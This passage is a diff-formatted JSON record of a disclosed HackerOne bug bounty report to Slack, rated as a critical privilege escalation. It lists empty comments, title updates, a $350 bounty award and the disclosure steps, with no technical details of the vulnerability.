+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-07T06:31:40.187Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-07T06:31:40.187Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1736928, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-08T23:01:46.627Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-08T23:01:46.627Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1743104, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-09T18:48:34.195Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-09T18:50:08.073Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1745222, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-12T18:17:26.183Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-12T18:17:26.183Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1750263, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-12T18:30:40.817Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-12T18:30:40.817Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1750307, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-12T18:45:29.558Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-12T18:45:29.558Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1750341, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-17T21:27:39.378Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-17T21:27:39.378Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1763497, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-20T13:41:06.198Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-20T13:41:06.198Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1768278, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-22T00:35:10.359Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-22T00:35:10.359Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {}, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 1773166, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-22T00:36:39.055Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-22T00:36:39.055Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1773170, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-22T07:33:43.996Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-22T07:33:43.996Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1773565, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-23T08:28:00.005Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-23T08:28:17.670Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1776074, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-26T20:42:48.328Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-26T20:42:48.328Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1782486, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-27T17:46:25.387Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-27T17:46:25.387Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1785178, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-05T17:54:12.333Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-05T17:54:12.333Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1808301, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-13T16:50:23.802Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-13T16:50:23.802Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1832980, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-14T20:59:21.423Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-14T20:59:21.423Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1836841, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:31:13.191Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:31:13.191Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1844871, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:32:17.075Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:32:17.075Z", 
+            "actor": {
+                "url": "/slack", 
+                "profile": {
+                    "name": "Slack"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
+                }
+            }, 
+            "team_handle": "slack", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "350.0", 
+            "collaborator": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1844873, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:33:06.993Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:33:06.993Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {}, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 1844874, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:33:45.191Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:33:45.191Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1844876, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:34:56.000Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:34:56.000Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1844880, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:34:56.066Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:34:56.066Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1844881, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bagipro", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bagipro", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/052/239/4da99970bfc1e4897f003883d05dc8acfec556ef_small.jpg?1510530490"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 75, 
+        "name": "Privilege Escalation"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "no-content", 
+    "allow_singular_disclosure_after": -43577668.80502791, 
+    "disclosed_at": "2017-07-17T23:34:56.039Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/200427", 
+    "created_at": "2017-01-22T22:34:07.420Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://slack.com", 
+            "about": "All your team communication in one place, instantly searchable, and available wherever you go.", 
+            "twitter_handle": "slackhq", 
+            "name": "Slack"
+        }, 
+        "handle": "slack", 
+        "url": "https://hackerone.com/slack", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/069/a44d7bfd843f514c723441a5a40daf5bac8e9e38_small.png?1449082084", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 69, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
